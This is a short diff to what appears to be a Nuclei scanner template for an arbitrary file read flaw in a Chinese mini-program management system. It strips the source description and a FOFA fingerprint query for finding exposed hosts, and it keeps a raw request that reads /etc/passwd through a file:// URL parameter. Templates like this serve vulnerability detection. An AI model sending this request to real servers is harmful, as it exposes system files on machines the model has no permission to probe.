@@ -3,12 +3,8 @@ info:
   name: 万能小程序运营管理系统 _requestPost 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bemkmsxp3phr0ct2'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bemkmsxp3phr0ct2
-    fofa: body="/com/css/head_foot.css" || body="/com/css/iconfont"
 http:
 - raw:
   - GET /api/wxapps/_requestPost?data=1&url=file:///etc/passwd HTTP/1.1
